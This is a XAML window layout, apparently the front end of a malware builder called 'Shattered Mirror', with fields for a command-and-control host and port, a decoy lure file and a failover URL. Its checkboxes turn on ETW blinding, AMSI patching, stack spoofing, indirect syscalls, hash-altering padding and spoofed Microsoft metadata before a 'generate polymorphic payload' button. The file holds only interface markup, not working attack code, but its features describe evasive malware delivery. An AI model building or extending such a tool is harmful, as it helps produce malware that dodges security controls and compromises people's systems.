<Window x:Class="Builder_GUI.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="SHATTERED MIRROR — Advanced Payload Builder v1.2" Height="700" Width="1050" 
        Background="#111111" WindowStartupLocation="CenterScreen">
    <Grid Margin="15">
        <Grid.RowDefinitions>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="*"/>
        </Grid.RowDefinitions>

        <!-- Header -->
        <StackPanel Grid.Row="0" Margin="0,0,0,20">
            <TextBlock Text="SHATTERED MIRROR" Foreground="#FF0000" FontSize="32" FontWeight="Bold" HorizontalAlignment="Center"/>
            <TextBlock Text="POLYMORPHIC EVASION ENGINE" Foreground="#888888" FontSize="14" HorizontalAlignment="Center"/>
            <Separator Background="#333333" Margin="0,10,0,0"/>
        </StackPanel>

        <!-- Main Body -->
        <Grid Grid.Row="1">
            <Grid.ColumnDefinitions>
                <ColumnDefinition Width="*"/>
                <ColumnDefinition Width="*"/>
            </Grid.ColumnDefinitions>

            <!-- Left Column: Core Config -->
            <StackPanel Grid.Column="0" Margin="0,0,10,0">
                <Border BorderBrush="#333333" BorderThickness="1" Background="#1A1A1A" Padding="15" CornerRadius="5" Margin="0,0,0,15">
                    <StackPanel>
                        <TextBlock Text="[1] C2 CORE CONFIG" Foreground="#FF0000" FontWeight="Bold" Margin="0,0,0,10"/>
                        <TextBlock Text="C2 Domain / IP:" Foreground="White" Margin="0,0,0,5"/>
                        <TextBox x:Name="txtDomain" Text="127.0.0.1" Background="#222222" Foreground="White" BorderBrush="#444444" Padding="5" Margin="0,0,0,10"/>
                        
                        <TextBlock Text="C2 Port:" Foreground="White" Margin="0,0,0,5"/>
                        <TextBox x:Name="txtPort" Text="6969" Background="#222222" Foreground="White" BorderBrush="#444444" Padding="5" Margin="0,0,0,10"/>
                        

                        <TextBlock Text="PSK ID (Optional):" Foreground="White" Margin="0,0,0,5"/>
                        <TextBox x:Name="txtPskId" Text="" Tag="Randomized if empty" Background="#222222" Foreground="White" BorderBrush="#444444" Padding="5" Margin="0,0,0,10" ToolTip="The 16-character session key. Leave empty for a random one."/>
                    </StackPanel>
                </Border>

                <Border BorderBrush="#333333" BorderThickness="1" Background="#1A1A1A" Padding="15" CornerRadius="5">
                    <StackPanel>
                        <DockPanel LastChildFill="False" Margin="0,0,0,10">
                            <TextBlock Text="[2] ORCHESTRATOR ATOMS" Foreground="#FF0000" FontWeight="Bold" DockPanel.Dock="Left"/>
                            <StackPanel Orientation="Horizontal" DockPanel.Dock="Right">
                                <Button Content="ALL" Click="SelectAllAtoms_Click" Background="Transparent" Foreground="#AAAAAA" BorderThickness="0" Cursor="Hand" Margin="5,0"/>
                                <TextBlock Text="|" Foreground="#444444"/>
                                <Button Content="NONE" Click="SelectNoneAtoms_Click" Background="Transparent" Foreground="#AAAAAA" BorderThickness="0" Cursor="Hand" Margin="5,0"/>
                            </StackPanel>
                        </DockPanel>
                        <ScrollViewer Height="180">
                            <WrapPanel x:Name="AtomPanel" ItemWidth="150">
                                <!-- Atoms will be populated dynamically -->
                            </WrapPanel>
                        </ScrollViewer>
                    </StackPanel>
                </Border>
            </StackPanel>

            <!-- Right Column: Evasion & Deployment -->
            <StackPanel Grid.Column="1" Margin="10,0,0,0">
                <Border BorderBrush="#333333" BorderThickness="1" Background="#1A1A1A" Padding="15" CornerRadius="5" Margin="0,0,0,15">
                    <StackPanel>
                        <TextBlock Text="[3] DEPLOYMENT &amp; SPOOFING" Foreground="#FF0000" FontWeight="Bold" Margin="0,0,0,10"/>
                        <TextBlock Text="Decoy File (Lure):" Foreground="White" Margin="0,0,0,5"/>
                        <Grid>
                            <Grid.ColumnDefinitions>
                                <ColumnDefinition Width="*"/>
                                <ColumnDefinition Width="Auto"/>
                            </Grid.ColumnDefinitions>
                            <TextBox x:Name="txtDecoy" IsReadOnly="True" Background="#222222" Foreground="White" BorderBrush="#444444" Padding="5"/>
                            <Button Grid.Column="1" Content="Browse" Click="BtnBrowse_Click" Background="#333333" Foreground="White" Padding="10,0" Margin="5,0,0,0"/>
                        </Grid>
                        
                        <TextBlock Text="Execution Order (IDs):" Foreground="White" Margin="0,10,0,5"/>
                        <TextBox x:Name="txtOrder" Text="4, 12, 1" Background="#222222" Foreground="White" BorderBrush="#444444" Padding="5" Margin="0,0,0,10"/>
                        
                        <TextBlock Text="Failover URL (Encrypted):" Foreground="White" Margin="0,0,0,5"/>
                        <TextBox x:Name="txtFailover" Text="" Background="#222222" Foreground="White" BorderBrush="#444444" Padding="5"/>
                    </StackPanel>
                </Border>

                <Border BorderBrush="#FF0000" BorderThickness="1" Background="#1A1A1A" Padding="15" CornerRadius="5" Margin="0,0,0,15">
                    <StackPanel>
                        <DockPanel LastChildFill="False" Margin="0,0,0,10">
                            <TextBlock Text="[4] ADVANCED OPS (DETACH EVASION)" Foreground="#FF0000" FontWeight="Bold" FontSize="14" DockPanel.Dock="Left"/>
                            <StackPanel Orientation="Horizontal" DockPanel.Dock="Right">
                                <Button Content="ALL" Click="SelectAllOps_Click" Background="Transparent" Foreground="#AAAAAA" BorderThickness="0" Cursor="Hand" Margin="5,0"/>
                                <TextBlock Text="|" Foreground="#444444"/>
                                <Button Content="NONE" Click="SelectNoneOps_Click" Background="Transparent" Foreground="#AAAAAA" BorderThickness="0" Cursor="Hand" Margin="5,0"/>
                            </StackPanel>
                        </DockPanel>
                        <UniformGrid Columns="3">
                            <CheckBox x:Name="chkEtw" Content="ETW Blinding" Foreground="White" IsChecked="True" Margin="0,5"/>
                            <CheckBox x:Name="chkAmsi" Content="AMSI Patching" Foreground="White" IsChecked="True" Margin="0,5"/>
                            <CheckBox x:Name="chkStack" Content="Stack Spoofing" Foreground="White" IsChecked="True" Margin="0,5"/>
                            <CheckBox x:Name="chkPayload" Content="Payload Extraction" Foreground="#FF00FF" IsChecked="True" Margin="0,5"/>
                            <CheckBox x:Name="chkIndirect" Content="Indirect Syscalls" Foreground="#FF00FF" IsChecked="True" Margin="0,5"/>
                            <CheckBox x:Name="chkIpc" Content="IPC Channel" Foreground="White" IsChecked="True" Margin="0,5"/>
                            <CheckBox x:Name="chkProxy" Content="Proxy Logic" Foreground="White" IsChecked="True" Margin="0,5"/>
                            <CheckBox x:Name="chkManager" Content="Atom Manager" Foreground="White" IsChecked="True" Margin="0,5"/>
                            <CheckBox x:Name="chkVeh" Content="VEH Handler" Foreground="White" IsChecked="True" Margin="0,5"/>
                            <CheckBox x:Name="chkCleanup" Content="Auto-Cleanup" Foreground="#00FFFF" IsChecked="True" Margin="0,5"/>
                            <CheckBox x:Name="chkBloat" Content="Binary Bloat" Foreground="#FFFF00" IsChecked="False" Margin="0,5" ToolTip="Pads the EXE with junk data to change its file hash/size."/>
                            <CheckBox x:Name="chkSpoof" Content="Spoof MS Meta" Foreground="#00FF00" IsChecked="False" Margin="0,5" ToolTip="Impersonates Microsoft Corp metadata (Caution: May trigger ML if unsigned)."/>
                        </UniformGrid>
                        <TextBlock Text="* Detaching components allows for surgical isolation testing." Foreground="#AAAAAA" FontStyle="Italic" Margin="0,10,0,0" FontSize="10" TextWrapping="Wrap"/>
                    </StackPanel>
                </Border>

                <Button x:Name="BtnGenerate" Content="GENERATE POLYMORPHIC PAYLOAD" Height="50" Background="#FF0000" Foreground="White" FontWeight="Bold" FontSize="16" Click="BtnGenerate_Click">
                    <Button.Resources>
                        <Style TargetType="Border">
                            <Setter Property="CornerRadius" Value="5"/>
                        </Style>
                    </Button.Resources>
                </Button>
            </StackPanel>
        </Grid>

        <!-- Footer: Logs -->
        <Grid Grid.Row="2" Margin="0,5,0,0">
            <Border BorderBrush="#333333" BorderThickness="1" Background="#0A0A0A" CornerRadius="5">
                <Grid>
                    <Grid.RowDefinitions>
                        <RowDefinition Height="Auto"/>
                        <RowDefinition Height="*"/>
                    </Grid.RowDefinitions>
                    <TextBlock Text="BUILD CONSOLE OUTPUT" Foreground="#444444" FontWeight="Bold" FontSize="10" Margin="10,2,0,0"/>
                    <TextBox x:Name="txtLogs" Grid.Row="1" Background="Transparent" Foreground="#00FF00" BorderThickness="0" FontFamily="Consolas" FontSize="11" IsReadOnly="True" VerticalScrollBarVisibility="Auto" AcceptsReturn="True" TextWrapping="Wrap" Padding="8"/>
                </Grid>
            </Border>
        </Grid>
    </Grid>
</Window>
